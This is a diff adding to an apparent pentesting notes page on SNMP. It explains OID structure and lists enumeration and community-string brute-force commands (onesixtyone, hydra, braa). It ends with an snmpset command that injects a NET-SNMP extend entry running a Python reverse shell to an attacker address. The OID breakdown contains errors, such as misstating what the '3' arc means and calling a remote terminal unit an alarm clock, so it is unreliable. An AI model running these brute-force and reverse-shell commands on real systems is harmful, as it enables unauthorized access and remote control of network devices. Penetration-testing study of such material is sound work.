@@ -340,7 +340,36 @@ To ensure that SNMP access works across manufacturers and with different client-
 
 #### **OID Example** <a href="#oid-example" id="oid-example"></a>
 
+<figure><img src="../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>
 
+### How do you read _an OID_?
+
+**`1 . 3 . 6 . 1 . 4 . 1 . 1452 . 1 . 2 . 5 . 1 . 3. 21 . 1 . 4 . 7`**
+
+Here is a breakdown of this address.
+
+* 1 – this is called the <mark style="color:red;">**ISO**</mark> and it establishes that this is an OID. This is why all OIDs start with “1”
+* 3 – this is called _<mark style="color:red;">**ORG**</mark>_ and it is used to specify the organization that built the device.
+* 6 – this is the <mark style="color:red;">**dod**</mark> or the <mark style="color:red;">**Department**</mark> of Defense which is the organization that established the Internet first.
+* 1 – this is the value of the internet to <mark style="color:red;">**denote**</mark> that all communications will happen through the Internet.
+* 4 – this value determines that this device is made by a <mark style="color:red;">**private**</mark> organization, not a government one.
+* 1 – this value denotes that an enterprise or a business entity makes the device.
+
+Moving on to the next set of numbers.
+
+* 1452 – gives the <mark style="color:red;">**name of the organization**</mark>** that **<mark style="color:red;">**manufactured**</mark>** this device.**
+* 1 – Explain the type of device. In this case, it is an alarm clock.
+* 2 – determines that this device is a remote terminal unit.
+
+The rest of the values give specific information about the device.
+
+* 5 – denotes a discrete alarm point.
+* 1 – specific point in the device
+* 3 – port
+* 21 – address of the port
+* 1 – display for the port
+* 4 – point number
+* 7 – state of the point
 
 ### Basic Information <a href="#basic-information" id="basic-information"></a>
 
@@ -389,3 +418,87 @@ snmpbulkwalk -c Public -v2c 192.168.1.7
 ```
 
 <figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
+
+If you know a valid community string, you can access the data using **SNMPWalk** or **SNMP-Check**:
+
+```bash
+snmpbulkwalk -c [COMM_STRING] -v [VERSION] [IP] . #Don't forget the final dot
+snmpbulkwalk -c public -v2c 192.168.1.7.
+
+snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP]
+snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] 1.3.6.1.2.1.4.34.1.3 #Get IPv6, needed dec2hex
+snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] NET-SNMP-EXTEND-MIB::nsExtendObjects #get extended
+snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] .1 #Enum all
+
+snmp-check [DIR_IP] -p [PORT] -c [COMM_STRING]
+
+nmap --script "snmp* and not snmp-brute" <target>
+
+braa <community string>@<IP>:.1.3.6.* #Bruteforce specific OID
+```
+
+
+
+ex snmp-check&#x20;
+
+```bash
+snmp-check 192.168.1.7 -p 161 -c Public 
+```
+
+<figure><img src="../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
+
+### HackTricks Automatic Commands <a href="#hacktricks-automatic-commands" id="hacktricks-automatic-commands"></a>
+
+```bash
+Protocol_Name: SNMP    #Protocol Abbreviation if there is one.
+Port_Number:  161     #Comma separated if there is more than one.
+Protocol_Description: Simple Network Managment Protocol         #Protocol Abbreviation Spelled out
+
+Entry_1:
+  Name: Notes
+  Description: Notes for SNMP
+  Note: |
+    SNMP - Simple Network Management Protocol is a protocol used to monitor different devices in the network (like routers, switches, printers, IoTs...).
+
+    https://book.hacktricks.xyz/pentesting/pentesting-snmp
+
+Entry_2:
+  Name: SNMP Check
+  Description: Enumerate SNMP
+  Command: snmp-check {IP}
+
+Entry_3:
+  Name: OneSixtyOne
+  Description: Crack SNMP passwords
+  Command: onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt {IP} -w 100
+
+Entry_4:
+  Name: Nmap
+  Description: Nmap snmp (no brute)
+  Command: nmap --script "snmp* and not snmp-brute" {IP}
+
+Entry_5:
+  Name: Hydra Brute Force
+  Description: Need Nothing
+  Command: hydra -P {Big_Passwordlist} -v {IP} snmp
+  
+  
+```
+
+#### Running the Injected Commands <a href="#running-the-injected-commands" id="running-the-injected-commands"></a>
+
+snmp-shell
+
+```bash
+sudo apt install snmp snmp-mibs-downloader rlwrap -y
+git clone https://github.com/mxrch/snmp-shell
+cd snmp-shell
+sudo python3 -m pip install -r requirements.txt
+```
+
+OR&#x20;
+
+```bash
+snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 192.168.1.7 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"192.168.1.9\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
+
+```
